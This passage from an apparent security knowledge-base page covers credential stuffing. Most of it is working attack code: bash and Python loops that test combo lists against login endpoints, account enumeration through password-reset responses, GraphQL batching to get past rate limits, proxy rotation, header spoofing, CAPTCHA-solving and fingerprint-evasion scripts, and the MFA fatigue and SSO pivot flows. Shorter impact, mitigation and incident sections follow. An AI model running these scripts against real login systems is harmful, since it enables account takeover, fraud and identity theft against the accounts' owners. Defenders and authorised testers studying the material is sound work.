+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Password reset endpoint: 200 = exists, 404 = does not exist</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read -r email; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>  code<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s -o /dev/null -w <span style="color:#e6db74">&#34;%{http_code}&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -X POST https://target.com/forgot-password -d <span style="color:#e6db74">&#34;email=</span>$email<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span>$code<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;200&#34;</span> <span style="color:#f92672">]]</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;[VALID] </span>$email<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> &lt; emails.txt
+</span></span></code></pre></div><p>Response differentials to look for:</p>
+<ul>
+<li><code>&quot;email not found&quot;</code> vs <code>&quot;check your inbox&quot;</code> — different body = valid account confirmed</li>
+<li>HTTP 200 vs HTTP 404 on reset endpoint</li>
+<li>Response time delta — valid usernames take longer to process (timing oracle)</li>
+</ul>
+<h3 id="3-mfa-prompt-bombing-mfa-fatigue">
+  3. MFA Prompt Bombing (MFA Fatigue)
+  <a class="anchor" href="#3-mfa-prompt-bombing-mfa-fatigue">#</a>
+</h3>
+<p>After confirming valid credentials, repeatedly trigger push MFA notifications until the victim approves out of fatigue or confusion.</p>
+<pre tabindex="0"><code>Flow:
+1. Confirm valid login pair via stuffing
+2. Initiate login repeatedly → each triggers a push notification (Duo, MS Authenticator, Okta Verify)
+3. Victim approves → full session access gained
+</code></pre><p>Applicable to: Push-based MFA
+Not applicable to: TOTP (code required per session), FIDO2/hardware keys</p>
+<h3 id="4-graphql-batching">
+  4. GraphQL Batching
+  <a class="anchor" href="#4-graphql-batching">#</a>
+</h3>
+<p>GraphQL allows multiple operations per HTTP request — bypasses per-request rate limiting by testing many pairs in a single call.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X POST https://target.com/graphql <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;[
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {&#34;query&#34;:&#34;mutation{login(email:\&#34;a@x.com\&#34;,password:\&#34;pass1\&#34;){token}}&#34;},
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {&#34;query&#34;:&#34;mutation{login(email:\&#34;b@x.com\&#34;,password:\&#34;pass2\&#34;){token}}&#34;},
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {&#34;query&#34;:&#34;mutation{login(email:\&#34;c@x.com\&#34;,password:\&#34;pass3\&#34;){token}}&#34;}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Each non-null token field in the response = confirmed hit</span>
+</span></span></code></pre></div><p>Why it works: Rate limiting counts HTTP requests, not operations within a request. 100 pairs in one request bypasses a &ldquo;10 req/min&rdquo; limit entirely.</p>
+<h3 id="5-legacy--mobile-api-endpoint-discovery">
+  5. Legacy / Mobile API Endpoint Discovery
+  <a class="anchor" href="#5-legacy--mobile-api-endpoint-discovery">#</a>
+</h3>
+<p>Main login endpoints often have stronger protection. Mobile and internal API paths frequently do not.</p>
+<pre tabindex="0"><code>Common unprotected paths to probe:
+/api/v1/login        /api/v2/auth        /auth/token
+/oauth/token         /mobile/login       /internal/authenticate
+
+# Discover auth subdomains
+subfinder -d target.com | grep -E &#34;auth|login|account|id|sso|portal&#34;
+</code></pre><h3 id="6-sso-pivot">
+  6. SSO Pivot
+  <a class="anchor" href="#6-sso-pivot">#</a>
+</h3>
+<p>One valid credential against an identity provider (Okta, Azure AD, Auth0) grants access to every downstream application in the SSO domain.</p>
+<pre tabindex="0"><code>Flow:
+1. Identify IdP (check login page redirect, SAML assertions, OAuth issuer field)
+2. Stuff credential list against the IdP login endpoint
+3. On hit → enumerate connected apps via SSO dashboard
+4. Access all downstream services without further authentication
+</code></pre><h3 id="test-cases">
+  Test Cases
+  <a class="anchor" href="#test-cases">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Scenario</th>
+<th>Payload / Action</th>
+<th>Expected Outcome</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ATO</td>
+<td>Valid combo against <code>/login</code></td>
+<td>302 redirect or <code>token</code> in response body</td>
+</tr>
+<tr>
+<td>Account Enumeration</td>
+<td>Email list against <code>/forgot-password</code></td>
+<td>200 vs 404 reveals registered accounts</td>
+</tr>
+<tr>
+<td>Timing Oracle</td>
+<td>Valid vs invalid username at login</td>
+<td>Valid usernames respond slower</td>
+</tr>
+<tr>
+<td>GraphQL Batching</td>
+<td>50 login mutations in one HTTP request</td>
+<td>Bypasses per-request rate limit</td>
+</tr>
+<tr>
+<td>Mobile API</td>
+<td>Target <code>/api/v1/login</code> instead of web form</td>
+<td>Endpoint lacks CAPTCHA or JS challenge</td>
+</tr>
+<tr>
+<td>MFA Fatigue</td>
+<td>Repeated login trigger after credential confirm</td>
+<td>Push notification sent each attempt</td>
+</tr>
+<tr>
+<td>SSO Pivot</td>
+<td>Stuff against Okta / Azure AD login</td>
+<td>Single hit → access to all linked apps</td>
+</tr>
+</tbody>
+</table>
+<h2 id="bypassing-defences">
+  Bypassing Defences
+  <a class="anchor" href="#bypassing-defences">#</a>
+</h2>
+<h3 id="1-ip-rotation-via-residential-proxies">
+  1. IP Rotation via Residential Proxies
+  <a class="anchor" href="#1-ip-rotation-via-residential-proxies">#</a>
+</h3>
+<p>Residential proxies assign a clean home-user IP per request — defeats per-IP lockout entirely. Residential ASNs are indistinguishable from organic traffic.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># proxychains with rotating list</span>
+</span></span><span style="display:flex;"><span>proxychains4 -q curl -s -X POST https://target.com/login <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#34;username=victim@x.com&amp;password=pass123&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Per-request proxy</span>
+</span></span><span style="display:flex;"><span>curl -x socks5h://user:pass@proxy.provider.com:1080 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -X POST https://target.com/api/login <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{&#34;email&#34;:&#34;test@x.com&#34;,&#34;password&#34;:&#34;pass123&#34;}&#39;</span>
+</span></span></code></pre></div><p>Proxy sources: Bright Data, Oxylabs, IPRoyal</p>
+<h3 id="2-request-jitter">
+  2. Request Jitter
+  <a class="anchor" href="#2-request-jitter">#</a>
+</h3>
+<p>Uniform request cadence is a bot signal. Random delays between requests mimic human behavior and evade timing-based detection.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> IFS<span style="color:#f92672">=</span>: read -r user pass; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>  curl -s -X POST https://target.com/login -d <span style="color:#e6db74">&#34;username=</span>$user<span style="color:#e6db74">&amp;password=</span>$pass<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  sleep <span style="color:#66d9ef">$((</span> RANDOM <span style="color:#f92672">%</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">))</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> &lt; combo_list.txt
+</span></span></code></pre></div><h3 id="3-header-spoofing">
+  3. Header Spoofing
+  <a class="anchor" href="#3-header-spoofing">#</a>
+</h3>
+<p>Rotate <code>User-Agent</code>, <code>X-Forwarded-For</code>, <code>Accept-Language</code>, and <code>Referer</code> — the headers WAFs and bot engines inspect most.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST https://target.com/login <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;X-Forwarded-For: 203.0.113.45&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Accept-Language: en-US,en;q=0.9&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Referer: https://target.com/&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#34;username=test@x.com&amp;password=pass123&#34;</span>
+</span></span></code></pre></div><h3 id="4-captcha-bypass">
+  4. CAPTCHA Bypass
+  <a class="anchor" href="#4-captcha-bypass">#</a>
+</h3>
+<p><strong>Solving Services</strong> — Integrate 2captcha / CapSolver APIs into checker configs for near-real-time CAPTCHA resolution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Submit to solving service, poll for result, inject token into login request</span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;http://2captcha.com/in.php&#39;</span>, data<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;key&#39;</span>: <span style="color:#e6db74">&#39;API_KEY&#39;</span>, <span style="color:#e6db74">&#39;method&#39;</span>: <span style="color:#e6db74">&#39;userrecaptcha&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;googlekey&#39;</span>: <span style="color:#e6db74">&#39;SITE_KEY&#39;</span>, <span style="color:#e6db74">&#39;pageurl&#39;</span>: <span style="color:#e6db74">&#39;https://target.com/login&#39;</span>})
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Poll → inject returned g-recaptcha-response token into POST body</span>
+</span></span></code></pre></div><p><strong>OCR for Image CAPTCHAs</strong> — Extract text from simple image challenges automatically.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pytesseract<span style="color:#f92672">,</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> io <span style="color:#f92672">import</span> BytesIO
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>img <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(BytesIO(requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;https://target.com/captcha.png&#39;</span>)<span style="color:#f92672">.</span>content))<span style="color:#f92672">.</span>convert(<span style="color:#e6db74">&#39;L&#39;</span>)
+</span></span><span style="display:flex;"><span>answer <span style="color:#f92672">=</span> pytesseract<span style="color:#f92672">.</span>image_to_string(img, config<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;--psm 8&#39;</span>)<span style="color:#f92672">.</span>strip()
+</span></span></code></pre></div><p><strong>Headless Browser</strong> — Renders full JS environment including mouse movement, keystroke cadence, and reCAPTCHA v3 scoring.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">page</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">newPage</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">setViewportSize</span>({ <span style="color:#a6e22e">width</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1366</span>, <span style="color:#a6e22e">height</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">768</span> });
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">mouse</span>.<span style="color:#a6e22e">move</span>(<span style="color:#ae81ff">400</span>, <span style="color:#ae81ff">300</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#39;#email&#39;</span>, <span style="color:#a6e22e">email</span>, { <span style="color:#a6e22e">delay</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">120</span> });    <span style="color:#75715e">// simulated typing cadence
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#39;#password&#39;</span>, <span style="color:#a6e22e">pass</span>, { <span style="color:#a6e22e">delay</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">95</span> });
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">click</span>(<span style="color:#e6db74">&#39;#submit&#39;</span>);
+</span></span></code></pre></div><h3 id="5-tls--behavioral-fingerprint-evasion">
+  5. TLS &amp; Behavioral Fingerprint Evasion
+  <a class="anchor" href="#5-tls--behavioral-fingerprint-evasion">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Defence Signal</th>
+<th>Evasion Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>JA3/JA3S TLS fingerprint</td>
+<td>Use Playwright — matches real browser TLS ClientHello</td>
+</tr>
+<tr>
+<td>HTTP/2 fingerprint (JA4)</td>
+<td><code>curl-impersonate</code> replicates legitimate browser H2 frames</td>
+</tr>
+<tr>
+<td>Mouse / keystroke biometrics</td>
+<td>Randomized delays and simulated mouse paths in headless automation</td>
+</tr>
+<tr>
+<td>Device fingerprint</td>
+<td>Reuse same browser profile per account for consistent fingerprint</td>
+</tr>
+<tr>
+<td>Cookie / session freshness</td>
+<td>Fetch a fresh session cookie per attempt before submitting credentials</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># curl-impersonate — exact TLS + HTTP/2 fingerprint of Chrome</span>
+</span></span><span style="display:flex;"><span>curl_chrome110 -X POST https://target.com/login <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{&#34;email&#34;:&#34;test@x.com&#34;,&#34;password&#34;:&#34;pass123&#34;}&#39;</span>
+</span></span></code></pre></div><h2 id="detection-techniques-offensive-perspective">
+  Detection Techniques (Offensive Perspective)
+  <a class="anchor" href="#detection-techniques-offensive-perspective">#</a>
+</h2>
+<h3 id="manual-detection--confirming-a-hit">
+  Manual Detection — Confirming a Hit
+  <a class="anchor" href="#manual-detection--confirming-a-hit">#</a>
+</h3>
+<p><strong>Status Code Anomalies</strong></p>
+<pre tabindex="0"><code>Failed login baseline:  HTTP 401 / 403 / 200 (with error body)
+Hit indicators:         HTTP 200 (with token body) / HTTP 302 redirect to /dashboard
+</code></pre><p><strong>Response Length Delta</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Hits return significantly more content (dashboard HTML, token payload)</span>
+</span></span><span style="display:flex;"><span>curl -s -o /dev/null -w <span style="color:#e6db74">&#34;%{size_download} %{http_code}&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -X POST https://target.com/login <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#34;username=test@x.com&amp;password=pass&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Failed: 312 200</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Hit:   4821 200  ← large body delta = likely authenticated</span>
+</span></span></code></pre></div><p><strong>Keyword Matching</strong></p>
+<pre tabindex="0"><code>Success keywords:  token, access_token, session, welcome, dashboard, Bearer
+Failure keywords:  invalid, incorrect, unauthorized, wrong password
+Ban keywords:      rate limit, too many, blocked, captcha
+</code></pre><p><strong>Redirect Behavior</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -L -o /dev/null -w <span style="color:#e6db74">&#34;%{url_effective}&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -X POST https://target.com/login -d <span style="color:#e6db74">&#34;username=x&amp;password=y&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Hit:  https://target.com/dashboard</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fail: https://target.com/login?error=1</span>
+</span></span></code></pre></div><h3 id="automated-detection">
+  Automated Detection
+  <a class="anchor" href="#automated-detection">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Grep response body for success tokens</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> IFS<span style="color:#f92672">=</span>: read -r user pass; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>  response<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s -X POST https://target.com/api/login <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -d <span style="color:#e6db74">&#34;{\&#34;email\&#34;:\&#34;</span>$user<span style="color:#e6db74">\&#34;,\&#34;password\&#34;:\&#34;</span>$pass<span style="color:#e6db74">\&#34;}&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;</span>$response<span style="color:#e6db74">&#34;</span> | grep -qE <span style="color:#e6db74">&#39;&#34;token&#34;|&#34;access_token&#34;|&#34;session_id&#34;&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;[HIT] </span>$user<span style="color:#e6db74">:</span>$pass<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> &lt; combo_list.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> open(<span style="color:#e6db74">&#39;combo_list.txt&#39;</span>):
+</span></span><span style="display:flex;"><span>    user, pwd <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;https://target.com/api/login&#39;</span>,
+</span></span><span style="display:flex;"><span>                      json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;email&#39;</span>: user, <span style="color:#e6db74">&#39;password&#39;</span>: pwd},
+</span></span><span style="display:flex;"><span>                      allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">in</span> [<span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">302</span>]:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;token|session|welcome|Bearer&#39;</span>, r<span style="color:#f92672">.</span>text, re<span style="color:#f92672">.</span>I):
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[HIT] </span><span style="color:#e6db74">{</span>user<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>pwd<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> len(r<span style="color:#f92672">.</span>content) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1000</span>:          <span style="color:#75715e"># response size anomaly</span>
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[POSSIBLE HIT] </span><span style="color:#e6db74">{</span>user<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>pwd<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># GraphQL — parse token fields from batched response</span>
+</span></span><span style="display:flex;"><span>curl -s -X POST https://target.com/graphql <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;[{&#34;query&#34;:&#34;mutation{login(email:\&#34;a@x.com\&#34;,password:\&#34;p1\&#34;){token}}&#34;},
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       {&#34;query&#34;:&#34;mutation{login(email:\&#34;b@x.com\&#34;,password:\&#34;p2\&#34;){token}}&#34;}]&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| python3 -c <span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import sys,json
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">for i,r in enumerate(json.load(sys.stdin)):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    t = r.get(&#39;data&#39;,{}).get(&#39;login&#39;,{}).get(&#39;token&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    if t: print(f&#39;[HIT] index {i}: {t}&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><h2 id="impact">
+  Impact
+  <a class="anchor" href="#impact">#</a>
+</h2>
+<ul>
+<li><strong>Account Takeover (ATO)</strong> — Full access to victim accounts: PII, saved addresses, order history, linked financials</li>
+<li><strong>Financial Fraud</strong> — Stored payment methods drained; unauthorized purchases, fund transfers, gift card abuse</li>
+<li><strong>Identity Theft</strong> — PII (DOB, SSN, address) enables downstream fraud, loan applications, social engineering</li>
+<li><strong>Credential Resale</strong> — Verified hits sold on dark web markets (streaming logins &lt;$5; banking accounts up to hundreds)</li>
+<li><strong>Lateral Pivot via SSO</strong> — One stuffed IdP credential cascades access across all downstream applications</li>
+<li><strong>Auth DoS</strong> — High-volume stuffing saturates auth servers, causing login failures for legitimate users</li>
+</ul>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OpenBullet 2</td>
+<td>Full-featured stuffing checker with config scripting</td>
+</tr>
+<tr>
+<td>Hydra / Medusa</td>
+<td>Multi-protocol login brute-forcer for non-HTTP services</td>
+</tr>
+<tr>
+<td>ffuf</td>
+<td>Fast web fuzzer; adaptable for credential stuffing via POST wordlists</td>
+</tr>
+<tr>
+<td>Burp Suite Intruder</td>
+<td>HTTP-level stuffing with payload lists and proxy chaining</td>
+</tr>
+<tr>
+<td>Playwright / Puppeteer</td>
+<td>Headless browser for CAPTCHA bypass and JS-rendered login flows</td>
+</tr>
+<tr>
+<td>proxychains4</td>
+<td>Route tool traffic through SOCKS/HTTP proxy chains</td>
+</tr>
+<tr>
+<td>curl-impersonate</td>
+<td>Mimics exact TLS and HTTP/2 browser fingerprints</td>
+</tr>
+<tr>
+<td>2captcha / CapSolver</td>
+<td>CAPTCHA solving service APIs</td>
+</tr>
+<tr>
+<td>pytesseract</td>
+<td>OCR-based image CAPTCHA text extraction</td>
+</tr>
+<tr>
+<td>Have I Been Pwned API</td>
+<td>Breached credential lookup for attack validation</td>
+</tr>
+</tbody>
+</table>
+<h2 id="mitigation--prevention">
+  Mitigation &amp; Prevention
+  <a class="anchor" href="#mitigation--prevention">#</a>
+</h2>
+<p><strong>Multi-Factor Authentication</strong> — Enforce TOTP, FIDO2/WebAuthn, or push MFA. Avoid SMS-only (vulnerable to SIM swapping).</p>
+<p><strong>Breached Credential Detection</strong> — Check passwords against known breach datasets at login and registration (NIST SP 800-63B). Reject or force reset of any breach-exposed password.</p>
+<p><strong>Adaptive Rate Limiting</strong> — Throttle on platform-wide failure rate, not per-IP or per-user. 10,000 IPs each making one failed attempt in 10 minutes is one attack.</p>
+<p><strong>Bot Management</strong> — Deploy Cloudflare Bot Management, Akamai Account Protector, or F5 with TLS/HTTP/2 fingerprinting (JA3/JA4). IP blocklists are insufficient against residential proxies.</p>
+<p><strong>Account Enumeration Prevention</strong> — Return identical responses — body, status code, and timing — for valid and invalid usernames. Timing side-channels are as actionable as explicit error messages.</p>
+<p><strong>CAPTCHA &amp; Behavioral Challenges</strong> — Deploy invisible behavioral CAPTCHA (hCaptcha, reCAPTCHA v3, Cloudflare Turnstile). Reserve hard challenges for high bot-likelihood sessions.</p>
+<h2 id="good-to-read">
+  Good To Read
+  <a class="anchor" href="#good-to-read">#</a>
+</h2>
+<h3 id="notable-incidents">
+  Notable Incidents
+  <a class="anchor" href="#notable-incidents">#</a>
+</h3>
+<ul>
+<li><strong>23andMe (2023):</strong> Stuffed credentials from prior breaches over five months without detection. Exploited the &ldquo;DNA Relatives&rdquo; feature to amplify initial hits into ~6.9M user records exposed. $30M class-action settlement + £2.31M UK ICO fine. <a href="https://www.bleepingcomputer.com/news/security/genetics-firm-23andme-says-user-data-stolen-in-credential-stuffing-attack/" target="_blank" rel="noreferrer noopener nofollow">BleepingComputer</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><strong>PayPal (Dec 2022):</strong> Two-day attack compromised ~35,000 accounts, exposing SSNs and tax IDs. Absence of mandatory MFA cited as root failure. $2M NY State settlement. <a href="https://www.bleepingcomputer.com/news/security/paypal-accounts-breached-in-large-scale-credential-stuffing-attack/" target="_blank" rel="noreferrer noopener nofollow">BleepingComputer</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
